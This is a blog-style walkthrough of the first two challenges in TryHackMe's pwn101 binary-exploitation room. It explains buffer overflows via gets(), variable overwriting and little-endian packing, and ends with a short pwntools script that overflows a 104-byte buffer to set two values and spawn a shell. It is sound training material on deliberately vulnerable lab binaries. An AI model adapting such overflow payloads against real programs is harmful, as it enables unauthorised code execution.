---
layout: post
title: Binary 101
date: 2023-12-17 12:00:00 +0300
categories: [Tryhackme, Medium]
tags: [Binary exploitation]
image: https://i.ibb.co/cgYN2Kr/th-3134630742.jpg
---

Hello guys and welcome to my walkthrough along this journey of binary exploitation. In this wreiteup we shall be handling the pwn101 room on [tryhackme](https://tryhackme.com/room/pwn101). Before jumping into this room, there are some prerequisites to complete the challenges:

    1. C programming language
    2. Assembly language (basics)
    3. Some experience in reverse engineering, using debuggers, understanding low-level concepts
    4. Python scripting and pwntools
    5. A lot of patience
    
Let's learn.

## 101

### Introduction

So we first begin with some easy task to handle and looking at the description ```This should give you a start: 'AAAAAAAAAAA'```
we get an idea that this might be a simple buffer overflow. A buffer overflow or buffer overrun is an anomaly whereby a program writes data to a buffer beyond the buffer's allocated memory, overwriting adjacent memory locations.
Example would look like.
![1](https://i.ibb.co/3RLRrq8/example-overflow.png)

### Disassembly in Ghidra

We are now going to fire up ghidra which would help us in dissasembly. We are then going to disassemble the main function to get an idea of how the program runs. 

Here we can notice three things, first is that we have a dangerous function ***gets()***. This is a dangerous function as it continues to store characters past the end of the buffer therefore opening the gates for buffer overflows.

Next we can also see that we have a funtion which calls to system. This is interesting.

![2](https://i.ibb.co/h2SyLr5/ghidra.png)

### Exploit 
To exploit this is very simple all we need to do is provide the program with 60 bytes and boom we spawn a shell. This can be easily done using the following ```cyclic 60```, which creates a cyclic pattern. Then we can feed that to the program and boom we have a shell.

![3](https://i.ibb.co/XbNcmQQ/shell.png)

## 102

### Intoroduction

So for the next challenge we are required to modify a variable's value. This occurs when data larger than the allocated memory space (buffer) is written into that buffer. As a result, it can overwrite adjacent memory, including variables.

### Disassembly in Ghidra

![4](https://i.ibb.co/N2bFgf6/ghidra.png)

He we can see that we have a buffer set to 104, meaning we can input data larger than 104 and be able to modify the variables that come in after. We can now see that we have two variables that have been defined. We can also see an if function that checks if the two variables are equal to some values, if not the program exits. Since we now know what the two values should be equal to, let us modify them.

### Exploit

After the disassembly we can now come up with our very own exploit. This tiem we are going to be using pwntools to craft an exploit. Looking at our disassembled code in ghidra we can see that the values for parameter 1 and parameter 2 should be ```0xc0ff33 and 0xc0d3``` respectively. Due to little endianness we first pass in the second parameter and then the first parameter. Little Endianness refers to the byte order used to store data in computer memory. In a system that uses Little Endianness, the least significant byte (the "little end") of a multi-byte value is stored at the lowest memory address, while the most significant byte (the "big end") is stored at a higher memory address. To check for endianness you can use ```rabin2 -I binary```.

```
from pwn import *

p = process("./pwn102.pwn102") # runs the binary locally
#p = remote("ip_provided", 9002) # runs remotely

param_1 = p32(0xc0ff33) # packed in 32 bit since it is short
param_2 = p32(0xc0d3)

payload = b'A' * 104 # filling the buffer with bunch of A's
payload += param_2 
payload += param_1

p.sendlineafter("?", payload) # sending the payload
p.interactive() # spawn a shell
```
